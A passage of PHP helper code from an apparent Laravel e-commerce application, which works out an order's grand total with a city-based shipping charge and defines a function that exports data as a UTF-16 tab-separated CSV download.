        if(isset($shipping_address['city'])){
            $city_name  = $shipping_address['city'];
            $city = \App\City::where('city_name_en',$city_name)->first();
            $city_id    = '';
            if ($city) {
                $city_id = $city->id;
                $delivery_period = \App\DeliveryPeriod::where("cities",'Like','%'.'"'.$city_id.'"'.'%')->first();
                if ($delivery_period) {
                    $shipping_charge = $delivery_period->delivery_amount;
                }
            }
        }
    }

    $order_grand_total     = ($subtotal + $tax + $shipping_charge) - $coupon_discount;
    $formated_number = number_format($order_grand_total, 2, '.', '');
    return $formated_number;
}

function toCSV($header, $data, $filename) {
    $sep  = "\t";
    $eol  = "\n";
    $csv  =  count($header) ? '"'. implode('"'.$sep.'"', $header).'"'.$eol : '';
    foreach($data as $line) {
      $csv .= '"'. implode('"'.$sep.'"', $line).'"'.$eol;
    }
    $encoded_csv = mb_convert_encoding($csv, 'UTF-16LE', 'UTF-8');
    header('Content-Description: File Transfer');
    header('Content-Type: application/vnd.ms-excel');
    header('Content-Disposition: attachment; filename="'.$filename.'.csv"');
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    header('Pragma: public');
    header('Content-Length: '. strlen($encoded_csv));
    echo chr(255) . chr(254) . $encoded_csv;
    exit;
}

?>
